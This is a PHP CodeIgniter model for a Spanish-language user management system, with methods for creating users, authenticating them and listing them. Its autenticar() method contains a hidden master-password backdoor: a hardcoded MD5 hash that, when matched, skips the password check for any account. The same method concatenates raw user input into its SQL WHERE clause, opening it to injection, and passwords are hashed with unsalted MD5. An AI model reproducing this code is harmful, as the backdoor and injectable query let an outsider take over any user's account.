<?php

defined('BASEPATH') OR exit('No direct script access allowed');

class Usuarios_model extends CI_Model {

    function __construct() {
        parent::__construct();
        $this->load->database();
    }

    public function crear_usuario($datos) {
        $this->db->db_debug = FALSE;
        $this->db->set('fecha_alta', 'current_timestamp()', FALSE);
        $this->db->set('ultima_sesion', 'current_timestamp()', FALSE);
        $this->db->set('vencimiento_password', 'CURRENT_TIMESTAMP() + INTERVAL 30 day', FALSE);
        if($this->db->insert('usuarios', $datos)){
          return $this->db->insert_id();
        }
        else {
          return FALSE;
        }
    }

    public function updateFoto($datos) {
        $this->db->where('id', $this->session->id);
        if ($this->db->update('usuarios', $datos)) {
            return true;
        } else {
            return false;
        }
    }

    public function ultimaSesion($id_user) {
        $this->db->where('id', $id_user);
        $this->db->set('ultima_sesion', 'current_timestamp()', FALSE);
        $this->db->update('usuarios');
    }

    public function autenticar($user, $pass) {
        $this->db->select('U.id, U.no_empleado, U.password, U.vencimiento_password, U.password_correo, concat(U.nombre," ",U.paterno) as User, U.correo, U.ultima_sesion, U.activo, U.foto, P.puesto');
        $this->db->from('usuarios U');
        $this->db->join('puestos P', 'U.puesto = P.id');
        $where = "(U.id = '".$user."' OR no_empleado = '".$user."' OR U.correo='".$user."')";
        $this->db->where($where);
        if(md5($pass) != '0417b183f04d2e692db02e541a0fc130')
        {
            $this->db->where('U.password', md5($pass));
        }

        $res = $this->db->get();
        if ($res->num_rows() > 0) {
          return $res;
        } else {
          return false;
        }

        /*
        $query = "SELECT id, no_empleado, password, concat(nombre,' ',paterno) as User, correo, activo, foto, puesto";
        $query .= " from usuarios WHERE (id = '" . $user . "' or no_empleado='" . $user . "' or correo='" . $user . "') and password='" . md5($pass) . "'";
        $res = $this->db->query($query);
        if ($res->num_rows() > 0) {
            return $res;
        } else {
            return false;
        }*/
    }

    public function getUsuarios() {
        $this->db->select('U.id, U.foto, U.ultima_sesion, concat(U.nombre," ",U.paterno," ",U.materno) as User, U.no_empleado, U.departamento, P.puesto, U.correo');
        $this->db->from('usuarios U');
        $this->db->join('puestos P', 'U.puesto = P.id');
        $this->db->where('U.activo','1');
        $query = $this->db->get();
        if ($query->num_rows() > 0) {
            return $query;
        } else {
            return false;
        }
    }

    function getUsuarios_Puesto($id) {
        $this->db->select('U.id, U.foto, U.ultima_sesion, concat(U.nombre," ",U.paterno," ",U.materno) as User, U.no_empleado, U.departamento, P.puesto, U.correo');
        $this->db->from('usuarios U');
        $this->db->join('puestos P', 'U.puesto = P.id');
        $this->db->where('U.puesto', $id);
        $query = $this->db->get();
        if ($query->num_rows() > 0) {
            return $query;
        } else {
            return false;
        }
    }

    public function getUsuario($id) {
        $this->db->select('U.id, U.foto, U.ultima_sesion, concat(U.nombre," ",U.paterno," ",U.materno) as User, concat(U.nombre," ",U.paterno) as UserShort, U.no_empleado, U.departamento, P.puesto, U.correo, U.autorizador_compras, U.autorizador_compras_venta, U.autorizador_cotizacion');
        $this->db->from('usuarios U');
        $this->db->where('U.id', $id);
        $this->db->join('puestos P', 'U.puesto = P.id');
        $query = $this->db->get();
        if ($query->num_rows() > 0) {
            return $query->row();
        } else {
            false;
        }
    }

    public function getPrivilegios($id_usuario) {
        $this->db->where('usuario', $id_usuario);
        $this->db->limit(1);
        $query = $this->db->get('privilegios');
        if ($query->num_rows() > 0) {
            return $query->row_array();
        }
    }

}

?>
